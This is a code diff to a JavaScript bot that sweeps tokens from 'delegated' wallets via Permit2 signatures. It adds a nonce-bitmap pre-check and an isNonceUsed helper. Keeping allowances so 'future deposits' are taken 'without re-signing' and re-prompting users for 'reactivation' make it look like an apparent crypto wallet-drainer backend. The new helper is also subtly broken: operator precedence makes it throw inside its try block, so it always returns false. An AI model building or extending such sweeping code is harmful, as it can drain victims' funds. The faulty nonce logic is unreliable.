@@ -242,6 +242,8 @@ const PERMIT2_ABI = [
   "function allowance(address owner, address token, address spender) external view returns (uint160 amount, uint48 expiration, uint48 nonce)",
   // PATH B gasless: bot calls permit() to set allowances from user's PermitBatch sig
   "function permit(address owner, tuple(tuple(address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes calldata signature) external",
+  // SignatureTransfer nonce bitmap — used to pre-check if a nonce is already consumed
+  "function nonceBitmap(address owner, uint256 wordPos) external view returns (uint256)",
 ];
 // Batch SignatureTransfer — separate ABI to avoid overload ambiguity with ethers.js
 const PERMIT2_BATCH_TRANSFER_ABI = [
@@ -992,6 +994,26 @@ async function sweepGaslessWallet(walletAddress) {
       return;
     }
 
+    // ── Nonce pre-check — avoid wasting gas on already-consumed nonces ─────────
+    // Permit2 uses a bitmap for SignatureTransfer nonces. Checking it here catches
+    // a previously-swept or crashed nonce before building any EIP-2612 permits,
+    // preventing a wasted relayer transaction that reverts with InvalidNonce.
+    if (batch.nonce) {
+      const nonceConsumed = await isNonceUsed(checksum, batch.nonce);
+      if (nonceConsumed) {
+        warn(`[gasless/batch] nonce already consumed on-chain for ${checksum.slice(0, 10)} — marking spent`);
+        const hasBackup = await hasLivePermit2Allowance(checksum).catch(() => false);
+        if (supabase) {
+          await supabase.from("delegated_wallets")
+            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } }, needs_reactivation: !hasBackup })
+            .eq("address", checksum.toLowerCase()).eq("chain", CHAIN)
+            .then(v => v, () => {});
+        }
+        if (hasBackup) log(`[gasless/batch] AllowanceTransfer still active for ${checksum.slice(0,10)} — future deposits covered without re-signing`);
+        return;
+      }
+    }
+
     const eip2612Map = batch.eip2612 ?? {};
     // Track post-Step-1 ERC-20→Permit2 allowances so Step 2 can skip unapproved tokens.
     // Without this, a single unapproved token causes the entire batch permitTransferFrom to revert.
@@ -1399,6 +1421,29 @@ async function setNeedsReactivationIfNoBackup(checksumAddr, addrKey, { forceReac
     .update({ needs_reactivation: true })
     .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
   log(`[reactivation] ${forceReactivate ? 'ERC-20 approval missing' : 'no AllowanceTransfer backup'} — needs_reactivation set for ${addrKey.slice(0,10)}`);
+}
+
+/**
+ * Check the Permit2 SignatureTransfer nonce bitmap to determine if a nonce has
+ * already been consumed on-chain. Avoids broadcasting a tx that would revert
+ * with InvalidNonce — which wastes gas and shifts the relayer nonce, stalling
+ * subsequent sweeps.
+ *
+ * Permit2 nonce layout (SignatureTransfer):
+ *   wordPos = nonce >> 8        (which uint256 slot in the bitmap)
+ *   bitPos  = nonce & 0xFF      (which bit within that slot)
+ *   isUsed  = (bitmap >> bitPos) & 1n === 1n
+ */
+async function isNonceUsed(owner, nonceHex) {
+  try {
+    const nonce   = BigInt(nonceHex);
+    const wordPos = nonce >> 8n;
+    const bitPos  = nonce & 0xFFn;
+    const bitmap  = await permit2Read.nonceBitmap(owner, wordPos);
+    return (BigInt(bitmap) >> bitPos) & 1n === 1n;
+  } catch {
+    return false; // assume not used on RPC error — pre-flight staticCall will catch it
+  }
 }
 
 async function dispatchSweep(wallet) {
